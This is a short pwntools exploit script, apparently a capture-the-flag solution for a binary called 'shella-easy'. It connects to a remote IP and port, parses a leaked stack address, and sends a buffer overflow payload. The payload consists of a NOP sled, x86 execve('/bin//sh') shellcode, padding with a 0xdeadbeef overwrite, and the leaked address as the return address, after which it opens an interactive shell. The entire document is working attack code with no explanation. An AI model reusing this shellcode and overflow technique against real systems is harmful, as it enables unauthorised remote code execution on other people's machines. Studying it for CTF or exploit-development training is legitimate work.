
from pwn import *

p = process('./shella-easy')
p = remote('52.15.182.55' ,12345)

# gdb.attach(p,'''
# break *0x08048541
# ''')

shellcode = "\x90"*20+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

a = int(p.recv()[17:27],16)
payload = ""
payload += shellcode
payload +=  "A"*(64-48) +"\xef\xbe\xad\xde"
payload += "A"*8
payload += p32(a)

p.sendline(payload)
p.interactive()
